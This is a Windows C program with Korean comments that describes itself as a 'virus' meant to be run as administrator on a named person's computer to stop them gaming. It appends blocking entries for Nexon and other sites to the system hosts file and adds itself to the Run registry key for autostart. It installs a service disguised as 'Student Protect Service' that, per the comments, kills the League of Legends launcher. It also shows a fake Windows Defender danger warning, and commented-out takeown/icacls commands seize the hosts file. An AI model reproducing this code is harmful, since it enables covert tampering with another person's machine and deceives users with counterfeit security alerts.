#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "ShReg.h"
#include <io.h>

#if 0
매커니즘:
         1.상엽이가 관리자 권한으로 virus.bat을 실행, 호스트 파일 권한 얻음 
         2.virus.exe와 롤을 꺼주는 GPService.exe를 C:\Program Files\Windows Defender\로 복사함.
         3.virus.exe실행
         4. C:\\Windows\\System32\\drivers\\etc\\hosts 에 내용을 추가하여 금지 사이트 등록(권한 필요) 
         5.자기 자신을 자동 실행 설정 
         6.GPService 서비스를 설치하고 실행
         7.GP서비스는 일정한 주기마다 lol.launcher 를 검사하여 종료시킴
#endif 

#define DEBUG 1

#define hDlgMain HWND_DESKTOP
#define hDlg HWND_DESKTOP

char *bansites[]={"www.ilbe.com",
                  "ilbe.com",
                  
                  "www.nexon.com",
                  "www.nexon.co.kr",
                  "game.com",
                  "game*",
                  "www.sa.nexon.com",
                  "sa.nexon.com",
                  "http://sa.nexon.com/channeling/Gate.aspx",
                  "http://sa.nexon.com/main/index.aspx",
                  "sa.nexon.com/channeling/Gate.aspx",
                  "sa.nexon.com/main/index.aspx",
                  "sa.nexon.com/channeling/",
                  "sa.nexon.com/main/",
                  "maplestory.nexon.com/",
                  "maplestory.nexon.com/main/",
                  "maplestory.nexon.com/main/index.aspx"
                  "http://www.nexon.com/Home/Game.aspx",
                  "https://www.nexon.com/Home/Game.aspx",
                  "www.nexon.com/Home/Game.aspx"
                  "http://ca.nexon.com/",
                  "https://ca.nexon.com/",
                  "ca.nexon.com/",
                  
                  "http://fifaonline3.nexon.com/main/index.aspx",
                  "http://tos.nexon.com/brand/index.aspx",
                  "https://tos.nexon.com/brand/index.aspx",
                  "http://tos.nexon.com/brand/"//이 정도면 되겠지....... 
                  
                  };

#define RunReg "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define HidePlace "C:\\Program Files (x86)\\SProtect"

#define SRVNAME "GPService"
//#define SERVICE_CONTROL_OK 128
#define EXENAME "GPService.exe"
#define DISPNAME "Student Protect Service"

SC_HANDLE hScm, hSrv;
SERVICE_STATUS ss;

void Install();
void UnInstall();
void GPStart();
void GPControl(DWORD dwControl);
//void QueryService();

int main(int argc, char *argv[])                                  //진입점을 정의합니다. 
{
  if(argc>3) goto stop;
  TCHAR Path[MAX_PATH];
  HKEY key;
  DWORD dwDisp;
  int NUMBANSITES=sizeof(bansites)/sizeof(char*);
  char host[MAX_PATH];                                            //호스트파일 경로 
  BOOL bfirst;
  int ans=0;
  //최초 실행 여부 판단
  SHRegReadString(SHCU,RunReg,"AutoRun","None",Path,MAX_PATH);
  if (lstrcmp(Path,"None") != 0) {
			bfirst=FALSE;
  } else {
			bfirst=TRUE;
  }
  if(bfirst){              //처음 실행이라면 
             //system("pushd C:\\Windows\\System32&&icacls C:\\Windows\\System32\\drivers\\etc\\hosts /T"
             //              "&&takeown /f C:\\Windows\\System32\\drivers\\etc\\hosts "
             //              "&&icacls C:\\Windows\\System32\\drivers\\etc\\hosts /grant administrators:f /t"
             //              "&&pause"
             //              /*icacls C:\Windows\System32\drivers\etc\hosts /save AclFile /T ->icacls sethc.exe /restore AclFile*/);
             GetSystemDirectory(host,MAX_PATH);                             //시스템 디렉토리를 얻고 
             strcat(host,"\\drivers\\etc\\hosts");                          //호스트 파일 이름 완성 
             FILE *fp=fopen(host,"at");                                     //추가(Append Text) 모드로 열어(권한 필요) 
             if(fp==NULL)                                                   //엵기 실패? 
             {
                         int err=GetLastError();                            //에러 코드 얻음 
                         char errMes[256];
                         FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,NULL,err,0,errMes,256,NULL);  //에러 메시지 생성 
                         MessageBox(0,"파일 열기 오류                        ",errMes,MB_OK);//에러 메시지 출력 
                         exit(-1);                                                             //종료
             }
             fseek(fp,0,SEEK_END);                                                             //파일의 맨 뒤로 이동 
             int i;
             for(i=0;i<NUMBANSITES;i++)                                                        //모든 bansite 금지 
             {
                            fprintf(fp,"127.0.0.1 %s\n",bansites[i]);                          //사이트 접속 금지 
             }
             fclose(fp);                                                                       //파일을 닫음. 이제 bansite 접속 못함. 
             ////파일 복사 후 자동 실행 설정
//             //GetModuleFileName(NULL,Path,MAX_PATH);
//             strcpy(Path,HidePlace);
               GetModuleFileName(NULL,Path/*+(strlen(HidePlace))-1*/,MAX_PATH);                //이 바이러스의 파일 위치를 얻어옴. 
//             MessageBox(0,Path,Path,MB_OK);
//             //CopyFile("C:\\Program Files\\Windows Defender\\");
             
             SHRegWriteString(SHCU,RunReg,"AutoRun",Path);                                     //자동 실행 설정 
  }
  //서비스를 설치했는지 검사
  hScm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
		if (hScm!=NULL) {
			hSrv=OpenService(hScm,SRVNAME,SERVICE_ALL_ACCESS);
			if (hSrv!=NULL) {
				//SetWindowText(hStatic,"현재 상태:설치되어 있습니다");
				CloseServiceHandle(hSrv);
			} else {
				//SetWindowText(hStatic,"현재 상태:설치되지 않았습니다");
			    Install();                                                                     //설치한다. 
            }
			CloseServiceHandle(hScm);                                                          //핸들 반납. 
		} 
  //롤 꺼주는 서비스 실행
  #if 0 
      프로세스명:
                 LoLPatcherUx.exe *32
                 LoLPatcher.exe *32
                 LolClient.exe *32

      캡션명:
             LoL Patcher
             PVP.Net 클라이언트 

      파일명:
            LoLLauncher.exe
            jpatch.exe

            LolClient.exe
            lol.launcher.exe
            lol.launcher.admin.exe
  #endif
  // SCM을 전역 변수로 열어 놓는다.
  hScm=OpenSCManager(NULL,NULL,GENERIC_READ);
  if (hScm==NULL) {
            MessageBox(hDlg,"SCM을 열 수 없습니다","에러",MB_OK|MB_ICONEXCLAMATION);
			//exit();
  }
  //이제 실행 가능
  GPStart(); //서비스 시작 
  MessageBox(0,TEXT("사용자의 컴퓨터가 위험에 노출되어 있습니다. 치료하려면 중단(A)를 클릭하십시오."),
                                  "Windows Defender 실시간 탐지-FATAL DANGER WARNING",
                                  MB_ABORTRETRYIGNORE|MB_ICONWARNING|MB_TOPMOST);
  if(0)
  {
  		stop:
                  //해제 
                  RegCreateKeyEx(SHCU,RunReg,0,NULL,REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,NULL,&key,&dwDisp);
                  RegDeleteValue(key,"AutoRun");
                  RegCloseKey(key);
                  UnInstall();
                  MessageBox(HWND_DESKTOP,TEXT("C:\\Windows\\System32\\drivers\\etc\\hosts의 맨 밑에서 부터 지우고 싶은 것들을 지우세요.\n 예: 127.0.0.1 www.nexon.com 지우기"),TEXT("이제 게임 덜 할 거지?"),MB_ICONINFORMATION);
  }
  CloseServiceHandle(hScm);
  //system("PAUSE");	
  return 0;
}

// 레지스트리에 문자열을 쓴다.
BOOL SHRegWriteString(HKEY hKey, LPCTSTR lpKey, LPCTSTR lpValue, LPCTSTR lpData)
{
	HKEY key;
	DWORD dwDisp;
	if (RegCreateKeyEx(hKey, lpKey,0,NULL,
		REG_OPTION_NON_VOLATILE, KEY_WRITE,NULL,&key,&dwDisp)
		!=ERROR_SUCCESS) 
		return FALSE;
	if (RegSetValueEx(key, lpValue,0,REG_SZ,(LPBYTE)lpData,lstrlen(lpData)+1)
		!=ERROR_SUCCESS) 
		return FALSE;
	RegCloseKey(key);
	return TRUE;
}

// 레지스트리에서 문자열을 읽는다.
BOOL SHRegReadString(HKEY hKey, LPCTSTR lpKey, LPCTSTR lpValue, LPCTSTR lpDefault, 
   LPTSTR lpRet, DWORD nSize) 
{
	HKEY key;
	DWORD dwDisp;
	DWORD Size;
	if (RegCreateKeyEx(hKey, lpKey,0,NULL,
		REG_OPTION_NON_VOLATILE, KEY_READ,NULL,&key,&dwDisp)
		!=ERROR_SUCCESS) 
		return FALSE;
	Size=nSize;
	if (RegQueryValueEx(key, lpValue, 0, NULL,(LPBYTE)lpRet, &Size)
		!=ERROR_SUCCESS) {
		lstrcpy(lpRet, lpDefault);
		return FALSE;
	}
	RegCloseKey(key);
	return TRUE;
}


// 서비스를 시작시킨다.
void GPStart()
{
	hSrv=OpenService(hScm,SRVNAME,SERVICE_START | SERVICE_QUERY_STATUS);
    if(hSrv==NULL)MessageBox(HWND_DESKTOP,"서비스 시작 오류","GPStart error",MB_OK);
	// 서비스를 시작시키고 완전히 시작할 때까지 대기한다.
	if (StartService(hSrv,0,NULL)==TRUE) {
		QueryServiceStatus(hSrv, &ss);
		while (ss.dwCurrentState != SERVICE_RUNNING) {
			Sleep(ss.dwWaitHint);
			QueryServiceStatus(hSrv, &ss);
		}
	}	
	CloseServiceHandle(hSrv);
	//QueryService();
}

// 서비스에 제어 코드를 보낸다.
void GPControl(DWORD dwControl)
{
	hSrv=OpenService(hScm,SRVNAME,GENERIC_EXECUTE);
	ControlService(hSrv,dwControl,&ss);
	CloseServiceHandle(hSrv);
	//QueryService();
}


// 서비스를 설치한다.
void Install()
{
	//SC_HANDLE hScm, hSrv;
	TCHAR SrvPath[MAX_PATH];
	SERVICE_DESCRIPTION lpDes;
	TCHAR Desc[1024];

	// SCM을 연다
	hScm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
	if (hScm==NULL) {
		MessageBox(hDlgMain,"SCM을 열 수 없습니다.","알림",MB_OK);
		return;
	}

	// 등록할 서비스 파일이 있는지 조사해 보고 경로를 구한다.
	GetCurrentDirectory(MAX_PATH,SrvPath);
	lstrcat(SrvPath, "\\");
	lstrcat(SrvPath, EXENAME);
	if (_access(SrvPath,0) != 0) {
		CloseServiceHandle(hScm);
		MessageBox(hDlgMain,"같은 디렉토리에 서비스 파일이 없습니다.","알림",MB_OK);
		return;
	}
	// 서비스를 등록한다.
	hSrv=CreateService(hScm,SRVNAME,DISPNAME,SERVICE_PAUSE_CONTINUE | 
		SERVICE_CHANGE_CONFIG,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,SrvPath,NULL,NULL,NULL,NULL,NULL);
	if (hSrv==NULL) {
		MessageBox(HWND_DESKTOP,"설치하지 못했습니다.","알림",MB_OK);
	} else {
		// 설명을 등록한다.
		//GetDlgItemText(hDlgMain,IDC_DESC,Desc,1024);
        //lpDes.lpDescription=Desc;
		//ChangeServiceConfig2(hSrv, SERVICE_CONFIG_DESCRIPTION, &lpDes);
		MessageBox(HWND_DESKTOP,"설치했습니다.","알림",MB_OK);//설치하면 오류 메시지는 안 나올 테니깐.. 
		//SetWindowText(hStatic,"현재 상태:설치되어 있습니다");
		CloseServiceHandle(hSrv);
	}
	CloseServiceHandle(hScm);
}

// 서비스를 제거한다.
void UnInstall()
{
//	SC_HANDLE hScm, hSrv;
//	SERVICE_STATUS ss;

	// SCM을 연다
	hScm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
	if (hScm==NULL) {
		MessageBox(HWND_DESKTOP,"SCM을 열 수 없습니다.","알림",MB_OK);
		return;
	}
	// 서비스의 핸들을 구한다.
	hSrv=OpenService(hScm,SRVNAME,SERVICE_ALL_ACCESS);
	if (hSrv==NULL) {
		CloseServiceHandle(hScm);
		MessageBox(hDlgMain,"서비스가 설치되어 있지 않습니다.","알림",MB_OK);
		return;
	}
	// 실행중이면 중지시킨다.
	QueryServiceStatus(hSrv,&ss);
	if (ss.dwCurrentState != SERVICE_STOPPED) {
		ControlService(hSrv,SERVICE_CONTROL_STOP,&ss);
		Sleep(2000);                                  //끝날 때까지 충분히 기다림. 
	}
	// 서비스 제거
	if (DeleteService(hSrv)) {
		MessageBox(hDlgMain,"서비스를 제거했습니다.","알림",MB_OK);
		//SetWindowText(hStatic,"현재 상태:설치되지 않았습니다");
	} else {
		MessageBox(hDlgMain,"서비스를 제거하지 못했습니다.","알림",MB_OK);
	}
	CloseServiceHandle(hSrv);
	CloseServiceHandle(hScm);
}

#include <aclapi.h>
//호스트 파일의 보안을 재설정한다. 
void SetSecurity()
{
	HANDLE hFile;
	TCHAR *str="누구나 읽을 수 있으며 User1만 쓸 수 있습니다";
	DWORD dwWritten;
	EXPLICIT_ACCESS EA[2];
	TCHAR pSid[255];
	TCHAR pDomain[255];
	DWORD cbSid=255,cbDomain=255;
	SID_NAME_USE peUse;
	PACL pAcl;
	SECURITY_DESCRIPTOR SD;
	SECURITY_ATTRIBUTES SA;

	// Everyone의 SID를 구한다.
	SID_IDENTIFIER_AUTHORITY SIDEvery=SECURITY_WORLD_SID_AUTHORITY;
	PSID pEverySID;
	AllocateAndInitializeSid(&SIDEvery,1,SECURITY_WORLD_RID,0,0,0,0,0,0,0,&pEverySID);

	memset(EA,0,sizeof(EXPLICIT_ACCESS)*2);
	EA[0].grfAccessPermissions=GENERIC_READ;
	EA[0].grfAccessMode=SET_ACCESS;
	EA[0].grfInheritance=NO_INHERITANCE;
	EA[0].Trustee.TrusteeForm=TRUSTEE_IS_SID;
	EA[0].Trustee.TrusteeType=TRUSTEE_IS_WELL_KNOWN_GROUP;
	EA[0].Trustee.ptstrName=(LPTSTR)pEverySID;

	// User1의 SID를 구한다.
	LookupAccountName(NULL,"User1",(PSID)pSid,&cbSid,pDomain, &cbDomain, &peUse);

	// ACE를 만든다.
	EA[1].grfAccessPermissions=GENERIC_ALL;
	EA[1].grfAccessMode=SET_ACCESS;
	EA[1].grfInheritance=NO_INHERITANCE;
	EA[1].Trustee.TrusteeForm=TRUSTEE_IS_SID;
	EA[1].Trustee.TrusteeType=TRUSTEE_IS_USER;
	EA[1].Trustee.ptstrName=(LPTSTR)pSid;

	// ACE를 ACL에 포함시키고 새 ACL을 만든다.
	SetEntriesInAcl(2,EA,NULL,&pAcl);

	// SD를 초기화한다.
	InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION);

	// ACL을 SD에 포함시킨다.
	SetSecurityDescriptorDacl(&SD,TRUE,pAcl,FALSE);

	// 보안 속성을 만든다.
	SA.nLength=sizeof(SECURITY_ATTRIBUTES);
	SA.lpSecurityDescriptor=&SD;
	SA.bInheritHandle=FALSE;

	// 파일을 생성한다.
	hFile=CreateFile("c:\\User1Only.txt", GENERIC_ALL, 0, &SA,
		CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile,str,lstrlen(str),&dwWritten,NULL);
	CloseHandle(hFile);

	// 실행중에 할당한 메모리를 해제한다.
	FreeSid(pEverySID);
	LocalFree(pAcl);
}

//진짜 바이러스는 별 짓을 다한다. 
//// app.cpp : Defines the entry point for the console application.
//
//// GUID를 사용하여 접근할 DeviceStack에 대한 접근이름을 구하는 응용프로그램 예제입니다
//
////#include "stdafx.h"
//#include <initguid.h>
//#include <setupapi.h>
//
//DEFINE_GUID(SampleGuid, 0x5665dec0, 0xa40a, 0x11d1, 0xb9, 0x84, 0x0, 0x20, 0xaf, 0xd7, 0x97, 0x78);
//// SampleGuid를 사용합니다. 이런 GUID는 현재 윈도우즈에서 정의되지 않은 값으로서, 샘플로 정의하여 사용합니다
//
//#define MAXDEVICENUMBER 10 // 10개 까지의 같은 Guid를 사용하는 장치를 지원한다는 의미입니다
//
//#include <winioctl.h>
//
//// 드라이버와 주고받을 ControlCode를 정의합니다
//#define IOCTL_SAMPLE_SET_EVENT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0800, METHOD_BUFFERED, FILE_ANY_ACCESS)
//typedef struct
//{
//	HANDLE UserEventHandle;
//	HANDLE ProcessId;
//}EVENT_INFORMATION, *PEVENT_INFORMATION;
//// 드라이버측으로 전달한 데이터구조체
//
//#define IOCTL_SAMPLE_IO_ENABLE	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0801, METHOD_NEITHER, FILE_ANY_ACCESS)
//
//#define IOCTL_SAMPLE_IO_DISABLE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0802, METHOD_NEITHER, FILE_ANY_ACCESS)
//
//// 현재 제공되는 GUID를 지원하는 DeviceStack의 개수를 알려줍니다
//int GetDeviceStackNameCount( struct _GUID * pGuid )
//{
//	SP_INTERFACE_DEVICE_DATA interfaceData;
//	int index=0;
//	HDEVINFO Info = SetupDiGetClassDevs( pGuid, 0, 0, DIGCF_PRESENT|DIGCF_INTERFACEDEVICE );
//
//	if( Info == (HDEVINFO) -1 )
//		return 0; // 시스템은 이런 명령을 지원하지 못한다
//
//	interfaceData.cbSize = sizeof(SP_INTERFACE_DEVICE_DATA);
//	
//	while( 1 )
//	{
//		BOOLEAN bl;
//		bl = SetupDiEnumDeviceInterfaces( Info, 0, pGuid, index, &interfaceData );
//		if( bl == FALSE )
//			break;
//		index++;
//	}
//
//	SetupDiDestroyDeviceInfoList( Info );
//
//	return index;
//}
//
//// 현재 제공되는 GUID를 지원하는 DeviceStack의 이름들을 알려줍니다
//BOOLEAN GetDeviceStackName( struct _GUID * pGuid, char ** ppDeviceName, int index )
//{
//	DWORD size;
//	BOOLEAN bl;
//	SP_INTERFACE_DEVICE_DATA interfaceData;
//	PSP_INTERFACE_DEVICE_DETAIL_DATA pData;
//	HDEVINFO Info = SetupDiGetClassDevs( pGuid, 0, 0, DIGCF_PRESENT|DIGCF_INTERFACEDEVICE );
//	char *pDeviceName;
//	*ppDeviceName = (char *)0;
//
//	if( Info == (HANDLE) -1 )
//		return FALSE;
//
//	interfaceData.cbSize = sizeof(SP_INTERFACE_DEVICE_DATA);
//	
//	bl = SetupDiEnumDeviceInterfaces( Info, 0, pGuid, index, &interfaceData );
//	if( bl == FALSE )
//		return bl;
//
//	SetupDiGetDeviceInterfaceDetail( Info, &interfaceData, 0, 0, &size, 0 );
//	pData = (PSP_INTERFACE_DEVICE_DETAIL_DATA)malloc( size );
//	pData->cbSize = sizeof(SP_INTERFACE_DEVICE_DETAIL_DATA);
//	SetupDiGetDeviceInterfaceDetail( Info, &interfaceData, pData, size, 0, 0 );
//
//	pDeviceName = (char *)malloc( strlen(pData->DevicePath) + 1 );
//	memset( pDeviceName, 0, strlen(pData->DevicePath) );
//	strcpy( pDeviceName, pData->DevicePath );
//	free( pData );
//
//	SetupDiDestroyDeviceInfoList( Info );
//	*ppDeviceName = pDeviceName;
//	return TRUE;
//}

//#include <conio.h>
//HANDLE handle;
//ULONG ret;
//int count;
//char *pDeviceName;
//BOOLEAN bl;
//HANDLE hEvent;
//
//int EnableIO()
//{
//	count = GetDeviceStackNameCount( (struct _GUID *)&SampleGuid );
//	if( count == 0 )
//		return 0; // 시스템은 SampleGuid를 지원하는 장치가 설치되지 않았습니다
//
//	bl = GetDeviceStackName( (struct _GUID *)&SampleGuid, &pDeviceName, 0 ); // 당연히 1나이상의 장치는 설치되어있으므로..0을 사용한다
//	// pDeviceName는 함수내에서 할당되는 메모리이므로, 사용이 끝나면 반드시 해제하여야 한다
//
//	if( bl == FALSE )
//		return 0; // 이런경우는 없어야 한다
//
//	// for IOPORT
//	{
//		char FullDeviceName[100];
//		strcpy( FullDeviceName, pDeviceName );
//		strcat( FullDeviceName, "\\IOPORT" );
//		handle = CreateFile( FullDeviceName, GENERIC_READ|GENERIC_WRITE
//						   , 0, 0, OPEN_EXISTING, 0
//						   , 0 );
//	}
//	if( handle == (HANDLE)-1 )
//	{
//		free( pDeviceName );
//		return 0; // Stack은 있지만, 현재 접근이 금지되어 있다
//	}
//
//	EVENT_INFORMATION EventInformation;
//
//    hEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
//
//	EventInformation.ProcessId = (PVOID)GetCurrentProcessId();
//	EventInformation.UserEventHandle = hEvent;
//	// 응용프로그램은 드라이버측으로 응용프로그램의 ProcessId와 기다리고자 하는 Event핸들을 보내야 합니다
//
//	DeviceIoControl( handle, IOCTL_SAMPLE_SET_EVENT, &EventInformation, sizeof(EVENT_INFORMATION), NULL, 0, &ret, NULL );
//	// 드라이버측으로 Event를 알려줍니다
//	
//	WaitForSingleObject( hEvent, INFINITE );
//	ResetEvent( hEvent );
//
//	MessageBox( NULL, "드라이버측으로 EventHandle을 전달하였습니다", "APP", MB_OK );
//
//	DeviceIoControl( handle, IOCTL_SAMPLE_IO_ENABLE, NULL, 0, NULL, 0, &ret, NULL );
//	// 드라이버에게 IO PORT접근허용을 요구합니다
//	
//	WaitForSingleObject( hEvent, INFINITE );
//	ResetEvent( hEvent );
//
//	MessageBox( NULL, "IO Port를 접근할 준비가 되었습니다", "APP", MB_OK );
//
//	// PC스피커를 켜봅니다
//	//_outp( 0x61, 0x03 );
//
//	// 스피커주파수를 재 설정합니다
//	//_outp( 0x43, 0xb6 );
//	//_outp( 0x42, 0x40 );
//	//_outp( 0x42, 0x10 );
//
//	//printf("아무글자나 치세요\n");
//	//getch();
//
//	// PC스피커를 끕니다
//	//_outp( 0x61, 0x00 );
//    return 0;
//}
//void DisableIO()
//{
//    DeviceIoControl( handle, IOCTL_SAMPLE_IO_DISABLE, NULL, 0, NULL, 0, &ret, NULL );
//	// 드라이버에게 IO PORT접근금지를 요구합니다
//	
//	WaitForSingleObject( hEvent, INFINITE );
//	ResetEvent( hEvent );
//
//	MessageBox( NULL, "IO Port를 접근금지가 되었습니다", "APP", MB_OK );
//
//	CloseHandle( hEvent );
//	CloseHandle( handle );
//
//	free( pDeviceName );
//	return;
//}
